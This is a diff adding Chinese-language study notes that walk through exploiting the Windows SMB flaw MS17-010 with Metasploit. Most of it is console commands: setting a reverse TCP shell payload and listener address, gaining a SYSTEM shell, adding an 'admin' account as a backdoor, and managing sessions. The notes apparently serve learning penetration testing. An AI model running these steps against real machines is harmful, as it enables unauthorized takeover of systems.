@@ -202,7 +202,51 @@ exploit
   exploit（命令）
   run
     msf6 auxiliary(scanner/smb/smb_ms17_010) >run
-    
+    show targets
+    查看执行目标
+   msf6 exploit(windows/smb/ms17_010_eternable) > show targets
+   msf6 exploit(windows/smb/ms17_010_eternable) > show options
+   攻击载荷实现连接
+   msf6 exploit(windows/smb/ms17_010_eternable) > show payloads
+   msf6 exploit(windows/smb/ms17_010_eternable) > search windows/x64/shell
+   msf6 exploit(windows/smb/ms17_010_eternable) > set payload windows/x64/shell/reverse_tcp
+   msf6 exploit(windows/smb/ms17_010_eternable) > show options
+   msf6 exploit(windows/smb/ms17_010_eternable) > set LHOST 192.168.1.57
+   msf6 exploit(windows/smb/ms17_010_eternable) > show options
+   参数全部ok
+   C:\Windows\system32>run
+   
+   成功后，按回车显示
+   C:\Windows\system32>
+   C:\Windows\system32>net user admin admin /add
+   乱码解决，编码
+   C:\Windows\system32>chcp 65001
+   C:\Windows\system32>net user
+   C:\Windows\system32>whoami
+   nt authority\system
+   最高权限
+   ctrl c 断开连接
+   
+   msf6 exploit(windows/smb/ms17_010_eternable) > exploit -j
+   后台执行
+   msf6 exploit(windows/smb/ms17_010_eternable) > sessions
+   查看会话
+   msf6 exploit(windows/smb/ms17_010_eternable) > session -i 2
+   2是sessions查询的会话id
+   C:\Windows\system32>background
+   后台执行
+   msf6 exploit(windows/smb/ms17_010_eternable) > session -k 2
+   杀死会话
+   
+   总结
+   查找CVE公布的漏洞
+   查找对应的exploit模块
+   配置模块参数
+   添加playload后门
+   执行exploit开始攻击
+   
+   
+   
     
   
 
